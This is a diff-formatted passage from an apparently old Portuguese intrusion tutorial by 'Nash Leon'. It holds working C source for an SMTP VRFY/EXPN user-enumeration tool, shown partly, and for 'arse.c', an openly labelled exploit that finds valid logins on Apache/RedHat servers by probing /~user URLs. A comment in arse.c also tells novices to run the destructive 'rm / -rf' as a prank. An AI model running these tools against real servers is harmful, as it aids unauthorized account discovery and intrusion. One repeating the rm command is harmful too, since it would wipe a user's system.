+         snprintf(comando, 125, "%s %s", atualc, linha);
+         send(sock, comando, strlen(comando), 0);  
+
+         tm_t.tv_sec  =  20; /* timeout to command */
+         tm_t.tv_usec =  0;
+   
+         FD_ZERO(&wakeup);
+         FD_SET(sock,&wakeup);
+
+         if(!select(sock+1, &wakeup, NULL, NULL, &tm_t)){
+            perror("connect");
+            passed = 0;
+
+          memcpy((char *)&sin.sin_addr, ph->h_addr, ph->h_length);
+            sin.sin_family =  AF_INET;
+            sin.sin_port   =  htons(IPPORT_SMTP);
+            sin.sin_addr   =  *((struct in_addr *)ph->h_addr);
+
+          if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){
+             perror("socket");
+             exit(1);
+          }
+
+          if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1){
+             perror("connect");
+             exit(1);
+          }
+
+          else{
+              #ifdef PORTUGUES
+                printf("reconectando em %s\n", roste);
+                printf("retentando comando [%s]\n", atualc);
+              #else
+                printf("reconnected to %s\n", roste);
+                printf("retrying [%s] command\n", atualc);
+              #endif
+           }
+
+           memset(buff, 0, 500);
+           recv(sock, buff, 500, 0);
+           continue;
+     }
+
+     memset(buff, 0, 500);
+     recv(sock, buff, 500, 0);
+     buff[strlen(buff)+1] = 0x00;
+ 
+/*
+ * 250 = user ok
+ * 550 = user unknow
+ */
+     if(strncmp(buff, "250", 3) == 0){
+        fprintf(usrout, "%s", linha);
+        fusers++;
+     }
+
+/*
+ * 252 = vrfy failed
+ * 502 = expn failed
+ */
+     if(opt == 1){
+        if(strncmp(buff, "252", 3) == 0){
+           #ifdef PORTUGUES
+             printf("comando VRFY falhou\nfinalizando...\n");
+           #else
+             printf("VRFY command failed\nexiting...\n");
+           #endif
+           close(sock); fclose(usrin);
+           fclose(usrout); exit(0);
+        }
+     }
+
+     if(opt == 2){
+        if(strncmp(buff, "502", 3) == 0){        
+           #ifdef PORTUGUES
+             printf("comando EXPN falhou\nfinalizando...\n");
+           #else
+             printf("EXPN command failed\nexiting...\n");
+           #endif
+           close(sock); fclose(usrin);
+           fclose(usrout); exit(0);
+        }
+     }
+
+     statit(ltotal, latual);
+     usleep(300000);
+   }
+
+   snprintf(atualc, 125, "QUIT\n");
+   send(sock, atualc, strlen(atualc), 0);
+
+   end   = time(NULL);
+   timer = (int)difftime(end, start);
+   
+   #ifdef PORTUGUES
+     printf("\nachados %i usuários em %d segundos\n", fusers, timer);
+   #else
+     printf("\nfound %i users in %d seconds\n", fusers, timer);
+   #endif
+
+   fclose(usrin); 
+   fclose(usrout);
+   
+   close(sock); 
+
+   return(1);
+}
+
+---------------------------------------------------------------------------
+
+
+* Brutal Force p/ WEB:
+
+---------------------------- arse.c ------------------------------------
+
+ /*
+  * arse.c
+  * --------
+  * Apache and Redhat Security Exploit (k, sorry for the name :))
+  * 
+  * ./arse www.server.com 80 file_with_names
+  *
+  * the default installation of Apache on a RedHat server might give us 
+  * valid logins.  If you do www.server.com/~validlogin you'll get a 403,
+  * else, if the login is not valid, you will get a 404.  
+  * Make sure www.server.com is a RedHat server, because 
+  * on other linux distro's everything gives a 403. (well.. slack does)
+  *
+  * for the kiddiez: to compile type "rm / -rf" (without brackets)
+  *
+  * by Incubus
+  * incubus@securax.org
+  *
+  * Greetz to G-girl, Root-dude, Securax, Zsh and ShellOracle.
+  *
+  * minor bug: the last name is checked twice. 
+  * 
+  */
+  
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+
+int main(int argc, char **argv){
+    char user[100];
+    char test[100];
+    int port, sock, result;
+    struct sockaddr_in  name;
+    struct hostent      *hostinfo;
+    char buffer[2048];
+    char url[120];
+    FILE *file;
+    if (argc != 4){
+        printf ("\nApache and Redhat Security Exploit.\n");
+        printf ("-----------------------------------\n");
+        printf ("usage: %s www.server.com 80 file_with_names.\n", argv[0]);
+        printf ("Written by Incubus, (incubus@securax.org)\n\n");
+        exit(0);
+    }
+    file = fopen(argv[3], "r");
+    if (file == NULL){
+        printf ("Error opening %s, exiting.\n", argv[3]); exit(-1);
+    }
+    port=atoi(argv[2]);    
+    hostinfo=gethostbyname(argv[1]);
+    if (!hostinfo){
+        printf("Error: unknown host %s (maybe a typo?)\n", argv[1]);
+        exit(-1);
+    }
+    name.sin_family=AF_INET;
+    name.sin_port=htons(port);
+    name.sin_addr=*(struct in_addr *)hostinfo->h_addr;    
+    sock=socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf ("Error: socket error.\n\n");
+        exit(-1);
+    }
+    result=connect(sock, (struct sockaddr *)&name, sizeof(struct sockaddr_in));
+    if (result != 0){
+        printf ("Error: Socket error.\n\n");
+        exit(-1);
+    }
+    send(sock, "HEAD / HTTP/1.0\n\n",18, 0);
+    recv(sock, buffer, sizeof(buffer), 0);
+    close(sock);
+    if (!(strstr(buffer,"Server: Apache"))){
+        printf ("%s is not running Apache on port %s, exiting.\n", argv[1], argv[2]);
+        exit(-1);
+    }
+    while (!feof(file)){
+        fscanf(file, "%s", user);
+        strcpy(test,"HEAD /~");
+        strcat(test, user);
+        strcat(test, " HTTP/1.0\n\n");
+        sock=socket(AF_INET, SOCK_STREAM, 0);
+        connect(sock, (struct sockaddr *)&name, sizeof(struct sockaddr_in));
+        send(sock, test , sizeof(test) , 0);
+        recv(sock, buffer, sizeof(buffer), 0);
+        close(sock);
+        if (strstr(buffer, "403 Forbidden"))
+            printf ("%s is a user.\n", user);
+        if (strstr(buffer, "200 Ok"))
+            printf ("%s is a user.\n", user);
+    }
+}
+
+------------------------------------------------------------------------
+
+
+Aih estah mais alguns exemplos basicos do que se pode fazer em cima
+das tecnicas antigas de invasao! Mais a frente entraremos em maiores
+esquemas e veremos maiores detalhes sobre tecnicas antigas e que ainda
+sao usadas.
+
+Um Abraco.
+
+							Nash Leon.
